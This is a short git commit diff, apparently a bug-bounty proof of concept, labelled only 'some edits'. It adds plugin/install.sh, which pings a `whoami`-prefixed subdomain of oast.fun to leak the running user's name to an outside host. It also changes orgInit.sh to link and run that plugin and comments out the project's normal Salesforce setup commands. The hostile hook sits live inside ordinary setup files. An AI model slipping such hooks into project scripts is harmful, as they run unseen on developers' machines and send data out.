a1de8599edb7d63d827d756b1683f5fb170a16e7
abzeabze <abze@wearehackerone.com>
2024-12-03 17:08:06 +0000

    some edits

---
+++ abzeabze/plugin/install.sh
@@ -0,0 +1,3 @@
+#!/usr/bin/env sh
+
+ping `whoami`.poc3.gnccrxicccelsgwodbsos07089csmksa6.oast.fun
--- orgInit.sh
+++ orgInit.sh
@@ -1,7 +1,8 @@
-sfdx  plugins:install @salesforce1/lwc-dev-server
-sfdx shane:org:create -f config/project-scratch-def.json -d 1 -s --json --userprefix int -o work.shop
-sfdx force:source:push
-sfdx force:user:permset:assign -n CustomerID
-sfdx shane:user:password:set -l User -g User -p sfdx1234 --json
-sfdx force:apex:execute -f scripts/CustomerIDSetup.cls
-sfdx force:org:open
+sfdx  plugins:link Schema-Exporter  #@salesforce1/lwc-dev-server
+sfdx schema:helpdemo -m "asd"
+#sfdx shane:org:create -f config/project-scratch-def.json -d 1 -s --json --userprefix int -o work.shop
+#sfdx force:source:push
+#sfdx force:user:permset:assign -n CustomerID
+#sfdx shane:user:password:set -l User -g User -p sfdx1234 --json
+#sfdx force:apex:execute -f scripts/CustomerIDSetup.cls
+#sfdx force:org:open
